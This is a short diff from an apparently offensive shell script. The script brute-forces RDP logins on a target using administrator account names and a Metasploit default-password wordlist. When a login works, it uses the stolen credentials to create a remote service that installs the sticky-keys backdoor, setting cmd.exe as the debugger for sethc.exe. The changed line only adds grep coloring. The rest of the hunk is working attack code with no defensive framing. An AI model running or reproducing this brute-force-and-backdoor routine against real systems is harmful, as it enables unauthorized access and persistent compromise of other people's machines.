@@ -12,7 +12,7 @@ elif nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
 	for user in администратор administrator admin; do
 		for password in $(cat /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt); do
 			if xfreerdp /v:$1:$DPORT /u:$user /p:"$password" /cert-ignore +auth-only /sec:nla > /dev/null 2> /dev/null; then 
-				echo user:$user password:$password | grep 'password:'
+				echo user:$user password:$password | grep 'password:' --color=auto
 				led red on 2> /dev/null
 				services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"'
 				services.py "$user:$password@$1" start -name 1
